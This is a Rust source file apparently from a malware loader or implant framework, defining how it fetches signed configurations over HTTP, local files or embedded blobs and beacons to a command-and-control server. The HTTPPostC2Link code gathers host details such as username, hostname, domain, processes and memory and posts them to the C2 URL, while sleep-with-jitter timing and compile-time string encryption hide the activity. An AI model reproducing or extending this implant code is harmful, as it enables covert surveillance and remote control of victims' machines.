use crate::dataoperation::{apply_all_dataoperations,DataOperation, UnApplyDataOperation};
use crate::poollink::Advanced;
use anyhow::bail;
use anyhow::Result;
use cryptify::encrypt_string;
use log::debug;
use log::info;
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::io::Read;
use std::{thread, time};

use crate::config::Config;

use std::fs;
use std::time::Duration;

use crate::payload::Payload;
use ring::signature::{self, KeyPair};

use crate::link_util::get_domain_name;
//use std::path::Path;
use crate::link_util::process_path;
use crate::link_util::process_name_and_parent;
use crate::link_util::bytes_to_gigabytes_string;
use crate::link_util::working_dir;
use crate::link_util::cmdline;

//use sysinfo::{    Components, Disks, Networks, System, Pid , get_current_pid};
use sysinfo::System;
use std::process;



#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub enum Link {
    HTTP(HTTPLink),
    DNS(DNSLink),
    FILE(FileLink),
    MEMORY(MemoryLink),
    HTTPPostC2(HTTPPostC2Link),
}
impl Link {
    pub fn print_link_compact(&self) {
        info!("{:?}", self);
    }

    pub fn fetch_config(
        &self,
        config: &Config,
        advanced: &Advanced,
        link_nb: i32,session_id: &String,running_thread: &Vec<Payload>
    ) -> Result<Config, anyhow::Error> {
        let result = self.fetch_data_with_post(session_id,running_thread, config);
        let data: Vec<u8> = match result {
            Ok(data) => data,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" fetch_data() error: "),
                error
            ),
        };
        debug!("{}", encrypt_string!("deserialized data"));
        let newconfig: Config = match serde_json::from_slice(&data) {
            Ok(newconfig) => newconfig,
            Err(error) => bail!(
                "{}{}{}{}",
                encrypt_string!("link "),
                link_nb,
                encrypt_string!(" deserialized data error: "),
                error
            ),
        };
        match config.verify_newconfig_signature(&newconfig) {
            Ok(()) => (),
            _unspecified => {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config signature: verify FAIL")
                )
            }
        }
        if advanced.accept_old == false {
            if config.date > newconfig.date {
                bail!(
                    "{}{}{}",
                    encrypt_string!("link "),
                    link_nb,
                    encrypt_string!(" config date: TOO OLD")
                )
            }
        };
        info!(
            "{}{}{}",
            encrypt_string!("link "),
            link_nb,
            encrypt_string!(" config signature: VERIFIED")
        );
        Ok(newconfig)
    }
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct HTTPLink {
    pub url: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}
#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct DNSLink {
    pub dns: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct FileLink {
    pub file_path: String,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct MemoryLink {
    pub memory_nb: i32,
    pub dataoperation: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct HTTPPostC2Link {
    pub url: String,
    pub dataoperation: Vec<DataOperation>,
    pub dataoperation_post: Vec<DataOperation>,
    pub sleep: u64,
    pub jitt: u64,
}

pub trait LinkFetch {
    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error>;
    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config) -> Result<Vec<u8>, anyhow::Error>;
    fn get_target(&self) -> String;
    fn get_dataoperation(&self) -> Vec<DataOperation>;
    fn get_sleep(&self) -> u64;
    fn get_jitt(&self) -> u64;

    fn sleep_and_jitt(&self) {
        let mut rng: rand::prelude::ThreadRng = rand::thread_rng();
        let random_number: f64 = rng.gen();

        let jitt = (self.get_jitt() as f64) * random_number;
        let total_sleep = (self.get_sleep() as f64) + jitt;
        if total_sleep != 0.0 {
            info!("{}{}", encrypt_string!("sleep: "), total_sleep);
        };
        let sleep_time: time::Duration = time::Duration::from_millis((total_sleep * 1000.0) as u64);
        thread::sleep(sleep_time);
    }

    fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
        for operation in self.get_dataoperation() {
            data = operation.un_apply_one_operation(data)?;
        }
        Ok(data)
    }

    fn fetch_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data(config)?;
        self.un_apply_all_dataoperations(data)
    }

    fn fetch_data_with_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
) -> Result<Vec<u8>, anyhow::Error> {
        self.sleep_and_jitt();
        let data = self.download_data_post(session_id,running_thread,config)?;
        self.un_apply_all_dataoperations(data)
    }

    //TODO apply all data_operation

}

//TODO remove duplicate code : https://hoverbear.org/blog/optional-arguments/

impl LinkFetch for Link {
    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Link::HTTP(link) => link.download_data(config),
            Link::DNS(link) => link.download_data(config),
            Link::FILE(link) => link.download_data(config),
            Link::MEMORY(link) => link.download_data(config),
            Link::HTTPPostC2(link) => link.download_data(config),
        }
    }

    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
) -> Result<Vec<u8>, anyhow::Error> {
        match &self {
            Link::HTTP(link) => link.download_data(config),
            Link::DNS(link) => link.download_data(config),
            Link::FILE(link) => link.download_data(config),
            Link::MEMORY(link) => link.download_data(config),
            Link::HTTPPostC2(link) => link.download_data_post(session_id,running_thread,config),
        }
    }

    fn get_target(&self) -> String {
        match &self {
            Link::HTTP(link) => link.get_target(),
            Link::DNS(link) => link.get_target(),
            Link::FILE(link) => link.get_target(),
            Link::MEMORY(link) => link.get_target(),
            Link::HTTPPostC2(link) => link.get_target(),
        }
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        match &self {
            Link::HTTP(link) => link.get_dataoperation(),
            Link::DNS(link) => link.get_dataoperation(),
            Link::FILE(link) => link.get_dataoperation(),
            Link::MEMORY(link) => link.get_dataoperation(),
            Link::HTTPPostC2(link) => link.get_dataoperation(),
        }
    }

    fn get_sleep(&self) -> u64 {
        match &self {
            Link::HTTP(link) => link.get_sleep(),
            Link::DNS(link) => link.get_sleep(),
            Link::FILE(link) => link.get_sleep(),
            Link::MEMORY(link) => link.get_sleep(),
            Link::HTTPPostC2(link) => link.get_sleep(),
        }
    }
    fn get_jitt(&self) -> u64 {
        match &self {
            Link::HTTP(link) => link.get_jitt(),
            Link::DNS(link) => link.get_jitt(),
            Link::FILE(link) => link.get_jitt(),
            Link::MEMORY(link) => link.get_jitt(),
            Link::HTTPPostC2(link) => link.get_jitt(),
        }
    }
}

impl LinkFetch for FileLink {
    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        debug!("{}{}", encrypt_string!("File Open: "), &self.get_target());
        let file_bytes: Vec<u8> = fs::read(self.get_target())?;
        Ok(file_bytes)
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.file_path)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

// ----------- COMPILE TIME mEMORy
// MEMORY_1
#[rustfmt::skip]
#[cfg(not(feature="mem1"))]
static MEMORY_1 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem1",feature="ollvm"))]
static MEMORY_1 : &[u8] = include_bytes!("/projects/config/mem1");

#[rustfmt::skip]
#[cfg(all(feature="mem1",not(feature="ollvm")))]
static MEMORY_1 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem1"));

// MEMORY_2
#[rustfmt::skip]
#[cfg(not(feature="mem2"))]
static MEMORY_2 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem2",feature="ollvm"))]
static MEMORY_2 : &[u8] = include_bytes!("/projects/config/mem2");

#[rustfmt::skip]
#[cfg(all(feature="mem2",not(feature="ollvm")))]
static MEMORY_2 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem2"));

// MEMORY_3
#[rustfmt::skip]
#[cfg(not(feature="mem3"))]
static MEMORY_3 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem3",feature="ollvm"))]
static MEMORY_3 : &[u8] = include_bytes!("/projects/config/mem3");

#[rustfmt::skip]
#[cfg(all(feature="mem3",not(feature="ollvm")))]
static MEMORY_3 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem3"));

// MEMORY_4
#[rustfmt::skip]
#[cfg(not(feature="mem4"))]
static MEMORY_4 : &[u8] = &[];

#[rustfmt::skip]
#[cfg(all(feature="mem4",feature="ollvm"))]
static MEMORY_4 : &[u8] = include_bytes!("/projects/config/mem4");

#[rustfmt::skip]
#[cfg(all(feature="mem4",not(feature="ollvm")))]
static MEMORY_4 : &[u8] = include_bytes!(concat!(env!("HOME"), "/.malleable/config/mem4"));

// ----------- COMPILE TIME mEMORy - end

impl LinkFetch for MemoryLink {
    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        match self.memory_nb {
            1 => Ok(MEMORY_1.to_vec()),
            2 => Ok(MEMORY_2.to_vec()),
            3 => Ok(MEMORY_3.to_vec()),
            4 => Ok(MEMORY_4.to_vec()),
            //TODO raise Error here
            _ => Ok(vec![]),
        }
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}{}", encrypt_string!("MEMORY_"), self.memory_nb)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for DNSLink {
    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.dns)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

impl LinkFetch for HTTPLink {
    fn download_data(&self,config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(config.link_timeout))
            .user_agent(&config.link_user_agent)
            .build()?;

        let mut res = client.get(&self.get_target()).send()?;
        let mut body: Vec<u8> = Vec::new();
        res.read_to_end(&mut body)?;
        Ok(body)
    }
    fn download_data_post(&self,_session_id: &String,_running_thread: &Vec<Payload>, _config:&Config
    ) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}


#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct LightPayload {
    pub todo: String


}
use std::os::unix::process::parent_id;

#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
pub struct PostToC2 {
    pub session_id: String,
    pub hostname: String,
    pub username: String,
    pub domain: String,
    pub arch: String,
    pub distro: String,
    pub desktop_env: String,

    pub cmdline : String,
    pub working_dir: String,
    pub process_path: String,
    pub process_name: String,
    pub pid: u32,
    pub parent_name:String,
    pub ppid: u32,

    pub total_memory: String,
    pub used_memory: String,
    pub nb_cpu: usize,

    pub data_operation: Vec<DataOperation>,
    pub running_thread: Vec<String>,
    pub peer_public_key_bytes : Vec<u8>,
    pub sign_bytes: Vec<u8>,
}




impl LinkFetch for HTTPPostC2Link {
    fn download_data(&self,_config:&Config) -> Result<Vec<u8>, anyhow::Error> {
        todo!()
    }
    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
    ) -> Result<Vec<u8>, anyhow::Error> {

        let mut running_thread_string=vec![];
        for thread in running_thread{
            running_thread_string.push(thread.string_payload_compact());
        }

        let key_pair: signature::Ed25519KeyPair = match signature::Ed25519KeyPair::from_pkcs8(config.loader_keypair.as_ref()){
            Ok(key_pair) => key_pair,
            Err(error) => bail!(
                "{}{}",
                encrypt_string!("loader_keypair use: "),
                error
            ),
        };
        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();

        let sys: System = System::new_all();
        let (process_name, parent_name) = process_name_and_parent(&sys);
        let process_path = process_path();

        //let args: Vec<String> = ;
    
        // Joindre les arguments en une seule chaîne, séparée par des espaces
        //let args_string = args;

        let mut post_data: PostToC2 = PostToC2{
            session_id: session_id.to_string(),
            hostname: whoami::devicename(),
            username: whoami::username(),
            domain:get_domain_name(),
            arch: whoami::arch().to_string(),
            distro: whoami::distro(),
            desktop_env: whoami::desktop_env().to_string(),
            pid: process::id(),
            ppid: parent_id(),          
            process_name : process_name,
            process_path: process_path,
            working_dir : working_dir(),
            cmdline : cmdline(),
            parent_name:parent_name,
            total_memory: bytes_to_gigabytes_string(sys.total_memory()),
            used_memory: bytes_to_gigabytes_string(sys.used_memory()),
            nb_cpu: sys.cpus().len(),      
            data_operation: self.dataoperation.clone(),
            running_thread: running_thread_string.clone(),
            peer_public_key_bytes: peer_public_key_bytes.clone(),
            sign_bytes: vec![],
        };


        let sign_data = format!("{:?}", post_data);
        let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
        let sign_bytes = sig.as_ref().to_vec();
        post_data.peer_public_key_bytes= peer_public_key_bytes;
        post_data.sign_bytes= sign_bytes;

        let post_data_bytes= serde_json::to_vec(&post_data)?;
        let m: Vec<u8>  = apply_all_dataoperations(&mut self.dataoperation_post.clone() , post_data_bytes)?;

        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(config.link_timeout))
            .user_agent(&config.link_user_agent)
            .build()?;

        let mut res = client.post(&self.get_target()).body(m).send()?;
        let mut body: Vec<u8> = Vec::new();
        res.read_to_end(&mut body)?;

        Ok(body)
    }

    fn get_target(&self) -> String {
        format!("{}", self.url)
    }
    fn get_dataoperation(&self) -> Vec<DataOperation> {
        self.dataoperation.to_vec()
    }
    fn get_sleep(&self) -> u64 {
        self.sleep
    }
    fn get_jitt(&self) -> u64 {
        self.jitt
    }
}

// TODO reflechir. est-ce qu'on envoit la config actuelle ?? c'est lourd et il faudrait la chiffrer a fond
